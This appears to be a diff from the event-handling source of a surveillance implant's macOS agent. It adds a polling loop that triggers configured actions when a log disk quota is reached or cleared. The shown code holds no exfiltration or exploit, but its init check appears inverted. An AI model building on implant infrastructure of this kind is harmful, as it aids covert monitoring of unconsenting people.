@@ -38,6 +38,7 @@
 
 #import "RCSMEvents.h"
 #import "RCSMTaskManager.h"
+#import "RCSMDiskQuota.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -47,6 +48,7 @@
 // MAXCOMLEN	16		/* max command name remembered */ 
 #define SCREENSAVER_PROCESS @"ScreenSaverEngin"
 
+extern NSString *RCSMaxLogQuotaReached;
 
 static RCSMEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
@@ -54,6 +56,8 @@ NSLock *connectionLock;
 
 
 @implementation RCSMEvents
+
+@synthesize mEventQuotaRunning;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -119,6 +123,26 @@ NSLock *connectionLock;
 - (id)autorelease
 {
   return self;
+}
+
+- (id)init
+{
+  Class myClass = [self class];
+  
+  @synchronized(myClass)
+  {
+    if (sharedEvents != nil)
+      {
+        self = [super init];
+    
+        if (self != nil)
+          {
+            mEventQuotaRunning = NO;
+            sharedEvents = self;
+          }
+      }
+  }
+  return sharedEvents;
 }
 
 #pragma mark -
@@ -1003,8 +1027,75 @@ NSLock *connectionLock;
   [outerPool release];
 }
 
+- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *actionId = (NSNumber*)[aNotify object];
+
+  if (actionId && [actionId intValue] > -1)
+    {
+#ifdef DEBUG_EVENTS
+    infoLog(@"event quota triggering action %@", actionId);
+#endif
+      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
+    }
+}
+
+typedef struct {
+  UInt32 disk_quota;
+  UInt32 tag;
+  UInt32 exit_event;
+} quota_conf_entry_t;
+
 - (void)eventQuota: (NSDictionary *)configuration
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+#ifdef DEBUG_EVENTS
+  infoLog(@"event quota start");
+#endif
+
+  [configuration retain];
+  
+  quota_conf_entry_t *params = (quota_conf_entry_t*)[[configuration objectForKey: @"data"] bytes];
+  
+  int exitAction = params->exit_event;
+  int enterAction = [[configuration objectForKey: @"actionID"] intValue];
+  
+  // Setting parameter
+  [[RCSMDiskQuota sharedInstance] setEventQuotaParam:configuration 
+                                           andAction:[configuration objectForKey:@"actionID"]];
+                                           
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+    {
+      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
+        {
+          mEventQuotaRunning = YES;
+          [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+        }
+        
+      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
+        {
+          mEventQuotaRunning = NO;
+          [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
+        }
+        
+      usleep(300000);
+    }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+    {
+      [configuration setValue: EVENT_STOPPED forKey: @"status"];
+      [configuration release];
+      
+      mEventQuotaRunning = NO;
+      
+#ifdef DEBUG_EVENTS
+      infoLog(@"event quota stopped");
+#endif
+    }
+  
+  [outerPool release];
   return;
 }
 
